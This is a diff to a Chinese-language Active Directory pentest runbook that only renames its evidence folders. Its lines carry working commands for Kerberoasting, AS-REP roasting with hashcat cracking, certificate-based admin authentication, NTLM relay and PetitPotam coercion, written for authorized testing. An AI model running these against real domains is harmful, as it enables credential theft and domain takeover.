@@ -16,8 +16,8 @@ sudo chronyc makestep || sudo ntpdate -u "$DC"
 证据目录建议：
 
 ```bash
-mkdir -p evidence/{enum,kerb,adcs,relay,lateral}
-date -Is | tee evidence/run.start
+mkdir -p work/<case>/{enum,kerb,adcs,relay,lateral}
+date -Is | tee work/<case>/run.start
 ```
 
 ## 1. 域信息与只读枚举
@@ -61,13 +61,13 @@ SharpHound.exe -c All --zipfilename bh.zip
 ```bash
 # Kerberoast：申请 RC4 TGS，离线破解
 impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip "$DC" -request \
-  -outputfile evidence/kerb/kerb.hash
-hashcat -m 13100 evidence/kerb/kerb.hash /usr/share/wordlists/rockyou.txt
+  -outputfile work/<case>/kerb/kerb.hash
+hashcat -m 13100 work/<case>/kerb/kerb.hash /usr/share/wordlists/rockyou.txt
 
 # AS-REP：无需预认证的账号
 impacket-GetNPUsers "$DOMAIN/" -dc-ip "$DC" -usersfile users.txt \
-  -format hashcat -outputfile evidence/kerb/asrep.hash
-hashcat -m 18200 evidence/kerb/asrep.hash /usr/share/wordlists/rockyou.txt
+  -format hashcat -outputfile work/<case>/kerb/asrep.hash
+hashcat -m 18200 work/<case>/kerb/asrep.hash /usr/share/wordlists/rockyou.txt
 ```
 
 降噪：按清单逐个请求目标 SPN；优先 AES 账号（服务端仅支持 RC4 时，按单账号低频重试）。
@@ -102,7 +102,7 @@ certipy auth -pfx administrator.pfx -dc-ip "$DC"
 # 先确认签名状态
 nxc smb <target> -u '' -p '' --gen-relay-list relay_targets.txt
 # relay（SMB -> SMB / LDAP / ADCS HTTP）
-impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks -of evidence/relay
+impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks -of work/<case>/relay
 # 强制认证（需单独授权）
 petitpotam.py <listener_ip> <target_ip>
 # 或 printerbug / dfscoerce
